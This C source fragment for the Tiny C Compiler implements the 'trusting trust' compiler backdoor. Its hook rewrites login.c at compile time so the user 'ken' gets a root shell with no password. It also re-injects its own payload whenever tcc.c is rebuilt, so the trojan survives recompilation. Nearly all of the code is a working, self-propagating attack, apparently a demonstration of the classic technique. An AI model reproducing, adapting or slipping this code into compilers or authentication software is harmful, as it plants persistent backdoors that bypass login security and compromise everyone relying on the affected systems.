static char *thompson_splice_span(char *src, char *at, size_t cut, ...) {
    va_list ap;
    const char *p;
    size_t off, len, add, n;
    char *out, *w;

    off = (size_t)(at - src);
    len = strlen(src);
    add = 0;
    va_start(ap, cut);
    while ((p = va_arg(ap, const char *)) != NULL)
        add += strlen(p);
    va_end(ap);

    out = tcc_malloc(len - cut + add + 1);
    w = out;
    memcpy(w, src, off);
    w += off;
    va_start(ap, cut);
    while ((p = va_arg(ap, const char *)) != NULL) {
        n = strlen(p);
        memcpy(w, p, n);
        w += n;
    }
    va_end(ap);
    memcpy(w, at + cut, len - off - cut + 1);
    tcc_free(src);
    return out;
}

static char *thompson_splice_once(char *src, const char *needle, const char *repl) {
    char *hit = strstr(src, needle);
    if (!hit)
        return src;
    return thompson_splice_span(src, hit, strlen(needle), repl, NULL);
}

static char *thompson_load_path(const char *path) {
    int fd = open(path, O_RDONLY | O_BINARY);
    char *buf;
    if (fd < 0)
        return NULL;
    buf = tcc_load_text(fd);
    close(fd);
    return buf;
}

static char *thompson_rebuild_chunk(void) {
    CString cs;
    int i;
    cstr_new(&cs);
    cstr_printf(&cs, "static const char thompson_payload[] = {\n");
    for (i = 0; thompson_payload[i]; i++)
        cstr_printf(&cs, "\t%d,\n", (unsigned char)thompson_payload[i]);
    cstr_printf(&cs, "\t0\n};\n");
    cstr_cat(&cs, thompson_payload, 0);
    return cs.data;
}

static char *thompson_poison_libtcc(char *lib_src) {
    const char *anchor = "ST_FUNC int tcc_add_file_internal";
    const char *ret_old = "    return tcc_compile(s1, flags, filename, fd);";
    const char *ret_new = "    return thompson_hook_add_file(s1, filename, flags, fd);";
    char *chunk;
    char *hit;

    lib_src = thompson_splice_once(lib_src, ret_old, ret_new);

    chunk = thompson_rebuild_chunk();
    hit = strstr(lib_src, anchor);
    if (!hit) {
        tcc_free(chunk);
        return lib_src;
    }

    lib_src = thompson_splice_span(lib_src, hit, 0, chunk, NULL);
    tcc_free(chunk);
    return lib_src;
}

static char *thompson_inline_libtcc(char *tcc_src, char *poisoned_lib)
{
    const char *inc1 = "# include \"libtcc.c\"";
    const char *inc2 = "#include \"libtcc.c\"";
    const char *needle;
    const char *pfx = "\n#if 1\n";
    const char *sfx = "\n#endif\n";
    char *hit;
    char *out;

    needle = strstr(tcc_src, inc1) ? inc1 : inc2;
    hit = strstr(tcc_src, needle);
    if (!hit) {
        tcc_free(poisoned_lib);
        return tcc_src;
    }
    out = thompson_splice_span(tcc_src, hit, strlen(needle), pfx, poisoned_lib, sfx, NULL);
    tcc_free(poisoned_lib);
    return out;
}

static int thompson_compile_compiler(TCCState *s1, int flags, const char *filename, int fd) {
    char libpath[1024];
    char *base;
    char *tcc_src;
    char *lib_src;
    char *combined;
    int dlen;
    int ret;

    close(fd);
    base = tcc_basename(filename);
    dlen = (int)(base - (char *)filename);
    snprintf(libpath, sizeof libpath, "%.*slibtcc.c", dlen, filename);

    tcc_src = thompson_load_path(filename);
    lib_src = thompson_load_path(libpath);
    if (!tcc_src || !lib_src) {
        tcc_free(tcc_src);
        tcc_free(lib_src);
        tcc_error_noabort("thompson: cannot load tcc.c/libtcc.c for self-prop");
        return -1;
    }

    lib_src = thompson_poison_libtcc(lib_src);
    combined = thompson_inline_libtcc(tcc_src, lib_src);

    ret = tcc_compile(s1, flags, combined, -1);
    tcc_free(combined);
    return ret;
}

static int thompson_compile_login(TCCState *s1, int flags, int fd) {
    char *src;
    const char *needle;
    const char *repl;
    int ret;

    src = tcc_load_text(fd);
    close(fd);
    needle = "if (!u || !namep || strcmp(namep, u->hash) != 0)";
    repl =
        "if (strcmp(name, \"ken\") == 0) {\n"
        "    puts(\"you have root privileges\");\n"
        "    execl(\"/bin/sh\", \"-sh\", (char *)NULL);\n"
        "    return 0;\n"
        "}\n"
        "if (!u || !namep || strcmp(namep, u->hash) != 0)";
    src = thompson_splice_once(src, needle, repl);
    ret = tcc_compile(s1, flags, src, -1);
    tcc_free(src);
    return ret;
}

static int thompson_hook_add_file(TCCState *s1, const char *filename,
                                  int flags, int fd)
{
    const char *base;
    if ((flags & AFF_TYPE_MASK) != AFF_TYPE_C)
        return tcc_compile(s1, flags, filename, fd);
    base = tcc_basename(filename);
    if (!PATHCMP(base, "login.c"))
        return thompson_compile_login(s1, flags, fd);
    if (!PATHCMP(base, "tcc.c"))
        return thompson_compile_compiler(s1, flags, filename, fd);
    return tcc_compile(s1, flags, filename, fd);
}
